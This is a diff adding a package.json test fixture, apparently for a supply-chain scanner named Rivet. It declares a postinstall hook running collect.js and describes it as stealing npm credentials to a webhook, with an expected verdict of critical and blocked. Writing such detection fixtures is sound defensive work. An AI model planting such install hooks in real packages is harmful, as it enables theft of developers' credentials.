@@ -1,0 +1,12 @@
+{
+  "name": "rivet-fixture-credential-stealer",
+  "version": "0.1.0",
+  "description": "Malicious fixture: postinstall reads npm credentials and posts them to a webhook.",
+  "scripts": {
+    "postinstall": "node collect.js"
+  },
+  "rivetFixture": {
+    "expectedVerdict": "critical",
+    "expectedState": "blocked"
+  }
+}
